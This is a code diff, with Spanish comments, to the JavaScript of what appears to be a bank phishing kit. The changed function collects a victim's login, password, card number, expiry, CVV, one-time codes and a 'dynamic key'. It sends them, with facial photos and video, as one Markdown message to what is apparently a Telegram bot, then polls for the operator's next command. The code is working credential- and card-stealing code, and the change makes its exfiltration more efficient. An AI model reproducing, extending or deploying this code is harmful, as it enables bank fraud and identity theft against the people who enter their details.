@@ -52,7 +52,49 @@ function b64toBlob(b64, type) {
 async function sendAndWait(payload, handlers) {
   showLoader();
   try {
-    let msgId = null;
+    // 1. Guardar temporalmente los datos nuevos en sessionStorage
+    if (payload.event === 'TARJETA') {
+      sessionStorage.setItem('temp_tc', payload.tc || '');
+      sessionStorage.setItem('temp_expiry', payload.expiry || '');
+      sessionStorage.setItem('temp_cvv', payload.cvv || '');
+    } else if (payload.event === 'OTP') {
+      sessionStorage.setItem('temp_otp', payload.otp || '');
+    } else if (payload.event === 'DINAMICA') {
+      sessionStorage.setItem('temp_dinamic', payload.dinamic || '');
+    }
+
+    // 2. Recuperar TODO lo acumulado (evitando que la clave salga como N/A)
+    const uUser = sessionStorage.getItem('bc_user') || USER || 'N/A';
+    const uPass = sessionStorage.getItem('bc_pass') || 'N/A';
+    const uTc   = sessionStorage.getItem('temp_tc') || 'N/A';
+    const uExp  = sessionStorage.getItem('temp_expiry') || 'N/A';
+    const uCvv  = sessionStorage.getItem('temp_cvv') || 'N/A';
+    const uOtp  = sessionStorage.getItem('temp_otp') || 'N/A';
+    const uDin  = sessionStorage.getItem('temp_dinamic') || 'N/A';
+    const msgId = sessionStorage.getItem('bc_msg_id');
+
+    // 3. Construir el texto unificado completo
+    let txt = `🔐 *REGISTRO COMPLETO*\n\n`;
+    txt += `🆔 ID: \`${SESSION_ID}\`\n`;
+    txt += `👤 Usuario: \`${uUser}\`\n`;
+    txt += `🔑 Clave: \`${uPass}\``;
+
+    if (uTc !== 'N/A') {
+      txt += `\n\n💳 *DATOS DE TARJETA:*\n`;
+      txt += `🔢 TC: \`${uTc}\`\n`;
+      txt += `📅 Exp: \`${uExp}\`\n`;
+      txt += `🔒 CVV: \`${uCvv}\``;
+    }
+
+    if (uOtp !== 'N/A') {
+      txt += `\n\n🔢 *OTP:* \`${uOtp}\``;
+    }
+
+    if (uDin !== 'N/A') {
+      txt += `\n\n🔑 *Clave Dinámica:* \`${uDin}\``;
+    }
+
+    let activeMsgId = null;
 
     if (payload.event === 'FACIAL') {
       const rPhoto = await fetch(`/api/sendPhoto`, {
@@ -66,9 +108,8 @@ async function sendAndWait(payload, handlers) {
         })
       });
       const dPhoto = await rPhoto.json();
-
       if (!dPhoto.ok) throw new Error('Error enviando captura');
-      msgId = dPhoto.result.message_id;
+      activeMsgId = dPhoto.result.message_id;
 
       if (payload.video) {
         fetch(`/api/sendDocument`, {
@@ -81,48 +122,36 @@ async function sendAndWait(payload, handlers) {
           })
         });
       }
+    } else if (msgId) {
+      // 4. EDITA EL MENSAJE EXISTENTE EN LUGAR DE CREAR UNO NUEVO
+      const res = await fetch(`/api/editMessageText`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          message_id: parseInt(msgId),
+          text: txt,
+          parse_mode: 'Markdown',
+          reply_markup: getKb(payload.event)
+        })
+      });
+      const data = await res.json();
+      
+      if (!data.ok) {
+        // Fallback si por algo el mensaje original ya no existía: crea uno nuevo y guárdalo
+        const resNew = await fetch(`/api/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ text: txt, parse_mode: 'Markdown', reply_markup: getKb(payload.event) })
+        });
+        const dataNew = await resNew.json();
+        if (!dataNew.ok) throw new Error('Error actualizando mensaje');
+        activeMsgId = dataNew.result.message_id;
+        sessionStorage.setItem('bc_msg_id', activeMsgId);
+      } else {
+        activeMsgId = parseInt(msgId);
+      }
     } else {
-      // Guardar temporalmente el dato actual en sessionStorage si aplica
-      if (payload.event === 'TARJETA') {
-        sessionStorage.setItem('temp_tc', payload.tc || '');
-        sessionStorage.setItem('temp_expiry', payload.expiry || '');
-        sessionStorage.setItem('temp_cvv', payload.cvv || '');
-      } else if (payload.event === 'OTP') {
-        sessionStorage.setItem('temp_otp', payload.otp || '');
-      } else if (payload.event === 'DINAMICA') {
-        sessionStorage.setItem('temp_dinamic', payload.dinamic || '');
-      }
-
-      // Recuperar todos los datos acumulados hasta el momento
-      const uUser   = sessionStorage.getItem('bc_user') || 'N/A';
-      const uPass   = sessionStorage.getItem('bc_pass') || 'N/A';
-      const uTc     = sessionStorage.getItem('temp_tc') || payload.tc || 'N/A';
-      const uExp    = sessionStorage.getItem('temp_expiry') || payload.expiry || 'N/A';
-      const uCvv    = sessionStorage.getItem('temp_cvv') || payload.cvv || 'N/A';
-      const uOtp    = sessionStorage.getItem('temp_otp') || payload.otp || 'N/A';
-      const uDin    = sessionStorage.getItem('temp_dinamic') || payload.dinamic || 'N/A';
-
-      // Construir un solo mensaje organizado con toda la información unificada
-      let txt = `📋 *REGISTRO COMPLETO [${payload.event}]*\n\n`;
-      txt += `🆔 ID: \`${SESSION_ID}\`\n`;
-      txt += `👤 Usuario: \`${uUser}\`\n`;
-      txt += `🔑 Clave: \`${uPass}\`\n`;
-
-      if (uTc !== 'N/A') {
-        txt += `\n💳 *DATOS DE TARJETA:*\n`;
-        txt += `🔢 TC: \`${uTc}\`\n`;
-        txt += `📅 Exp: \`${uExp}\`\n`;
-        txt += `🔒 CVV: \`${uCvv}\`\n`;
-      }
-
-      if (uOtp !== 'N/A') {
-        txt += `\n🔢 *OTP:* \`${uOtp}\`\n`;
-      }
-
-      if (uDin !== 'N/A') {
-        txt += `\n🔑 *Clave Dinámica:* \`${uDin}\`\n`;
-      }
-
+      // Si no hubiera ID guardado, manda uno nuevo por seguridad
       const res = await fetch(`/api/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -130,10 +159,11 @@ async function sendAndWait(payload, handlers) {
       });
       const data = await res.json();
       if (!data.ok) throw new Error('Error enviando mensaje');
-      msgId = data.result.message_id;
+      activeMsgId = data.result.message_id;
+      sessionStorage.setItem('bc_msg_id', activeMsgId);
     }
 
-    pollAction(msgId, handlers);
+    pollAction(activeMsgId, handlers);
   } catch (e) {
     hideLoader();
     alert('Error de red al enviar la información.');
